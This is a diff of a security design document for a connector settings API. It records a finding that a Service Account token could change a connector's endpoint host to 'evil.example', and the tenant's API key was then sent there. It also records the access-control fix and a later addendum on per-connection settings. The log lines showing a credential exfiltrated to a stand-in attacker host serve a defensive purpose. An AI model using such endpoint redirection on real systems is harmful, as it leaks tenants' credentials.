@@ -187,9 +187,10 @@ newrelic endpoint.host="evil.example"  stored_ok=true  outcome=OK
   urls=["https://evil.example/v2/applications.json"]  X-Api-Key on the wire
 ```
 
-The writer needed no special standing: the settings route is `Access::Principal`, which
-`require_principal` admits for any kind, and an agent token resolves to `PrincipalKind::Agent`. That
-is `AGENTS.md`'s *"an agent's token grants access to an operation, never to a credential"*, broken
+The writer needed no special standing: the settings route was `Access::Principal`, which
+`require_principal` admitted for any kind, and a Service Account token resolves to
+`PrincipalKind::ServiceAccount`. That is `AGENTS.md`'s *"a Service Account token grants access to an
+operation, never to a credential"*, broken
 through a configuration field — and it was **new reachability**, because before the diff
 `execution::invoker` bound `MemoryConfig::new()` and both connectors refused before dispatch.
 
@@ -379,14 +380,15 @@ one that section already records and is not a new one.
 
 ### Who may supply a value, and why that is the fix rather than a value rule
 
-**Decision: `PUT` and `DELETE` on `/api/connections/{connector}/settings/{service}/{field}` are
-`Access::PrincipalOfKind(&[PrincipalKind::User])`. The `GET` collection stays open to every kind.**
+**Decision at X-47: `PUT` and `DELETE` on
+`/api/connections/{connector}/settings/{service}/{field}` admitted users only. X-91 later narrowed
+that to the deployment-owned operator policy. The `GET` collection stays open to every kind.**
 
-The route was `Access::Principal`, which `require_principal` admits for *any* kind, and an agent
-token resolves to `PrincipalKind::Agent`. So an agent holding nothing but an operation grant could
-name the origin its tenant's credential is delivered to — `AGENTS.md` § Invariants, verbatim: *"An
-agent's token grants access to an operation, never to a credential."* `Access::PrincipalOfKind` is
-the mechanism `/api/agents` already uses; nothing new was invented for this.
+The route was `Access::Principal`, which `require_principal` admitted for *any* kind, and a Service
+Account token resolves to `PrincipalKind::ServiceAccount`. So a Service Account holding nothing but
+an operation grant could name the origin its tenant's credential is delivered to — `AGENTS.md`
+§ Invariants, verbatim: *"A Service Account token grants access to an operation, never to a
+credential."*
 
 **The gate is the whole write surface, not only the fields whose `host_pinning` is `PinnedTo`.** The
 narrower rule was available and is not taken:
@@ -492,3 +494,16 @@ The reasoning for the order:
 - **The store is single-process**, like `ConnectionGuard`: the read-decide-write around the tenant
   allowance is claimed within this process and not across a cluster. The same limit `connections.md`
   already records, in the same words.
+
+## Addendum, 2026-08-03 — X-14 has inserted the instance seam
+
+Section 6 described the sequencing contract; connector v0.18 supplied the instance-aware
+`ConfigStore` port and X-14 has now completed it. `SettingsStore` keys plural connections by the
+same host-minted UUID used in credential addressing. Creating the second connection moves the sole
+legacy settings namespace under the first UUID before the atomic credential batch; a refused batch
+restores the legacy namespace. Deleting one of two discards the selected settings and moves the
+survivor back to the legacy namespace. Label-scoped settings routes expose set state and accept
+values exactly like the original routes; values still never come back out.
+
+The historical “No per-instance settings” bullet above is therefore superseded. Every other
+boundary in §7 remains unchanged.
